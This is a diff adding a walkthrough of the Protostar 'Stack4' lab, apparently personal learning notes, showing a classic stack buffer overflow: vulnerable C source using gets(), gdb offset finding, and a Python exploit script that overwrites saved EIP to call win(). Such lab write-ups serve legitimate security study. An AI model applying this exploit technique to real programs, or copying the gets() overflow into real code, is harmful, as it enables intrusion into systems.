@@ -144,4 +144,93 @@ Stack3:
     Files inside of ./0x0D/3/gdb.*/*.gdb
 
 Stack4:
-  TBC |06/02/2021|DD/MM/YYYY|
+  Stack4 takes a look at overwriting saved EIP and standard buffer overflows.
+  Hints:
+    - A variaty of introductory papers into buffer overflows may help.
+    - gdb lets you do "run < input"
+    - EIP is not directly after the end of buffer, compiler padding can also increase the size.
+  
+  Source code:
+  ```c
+  #include <stdlib.h>
+  #include <unistd.h>
+  #include <stdio.h>
+  #include <string.h>
+
+  void win()
+  {
+    printf("code flow successfully changed\n");
+  }
+
+  int main(int argc, char **argv)
+  {
+    char buffer[64];
+
+    gets(buffer);
+  }
+  ```
+  This is interesting since we aren't calling the win() function at any point in time.
+
+  Initial Thoughts:
+    At the end of the buffer, find a way to call the win() function.
+  
+  Instead of overflowing a local variable, we are going to overflow the return value on the actual stack.
+  When main returns, it reads wrong value and executes the win() function instead.
+
+  Lets modify the script from the last stack, I copied my script into a new file called stack4_overwrite.py
+
+  ```py
+  padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ"
+  print(padding)
+  ```
+  now, lets do the exact same as what we did at the beginning:
+    python /tmp/stack4_overwrite.py > /tmp/exp
+
+  We should now run the application using this as input within gdb.
+  ```gdb
+  (gdb) r < /tmp/exp
+  Starting program: /opt/protostar/bin/stack4 < /tmp/exp
+
+  Program received signal SIGSEGV, Segmentation fault.
+  0x54545454 in ?? ()
+  ```
+  See, we have successfully re-written code execution to bad memory, Via the Segmentation fault.
+  Now, if we look closely at the registers, we can see the the base pointer is 0x53 and the instruction pointer is 0x54
+  This is because the old base pointer is left on the stack right before the instruction pointer.
+  Now we know exactly where the hex value is for the pointer, it is at T so lets remove some of the padding in our script down to "RRRR"
+  ```py
+  padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRR"
+  ```
+
+  Now, lets use objdump to find the address of the win() function.
+  We get the address 0x080483f4 for the win() function:
+    080483f4 g     F .text  00000014              win
+  
+  We can now make some pointers in our script.
+  First, we are going to want to import struct, the create the pointer variables.
+  We don't care about what ebp is so we can set it to anything.
+  But for eip, we are going to want to pack it into that address, using the struct.pack method
+  At the end of that, the script should look like:
+  ```py
+  import struct
+
+  padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRR"
+  ebp = "AAAA"
+  eip = struct.pack("I", 0x080483f4)
+
+  print(padding + ebp + eip)
+  ```
+  lets now pipe the output into the exp file:
+    python /tmp/stack4_overwrite.py > /tmp/exp
+  
+  And now execute the exploit and pipe it into stack4
+  python /tmp/stack4_overwrite.py | /opt/protostar/bin/stack4
+
+  ```bash
+  user@protostar:/tmp$ python stack4_overwrite.py | /opt/protostar/bin/stack4
+  code flow successfully changed
+  Segmentation fault
+  ```
+
+  See, we have successfully overflowed the stack to call the win() function.
+  To see the gdb result, you can look at ./0x0D/4/gdb.2/main.gdb
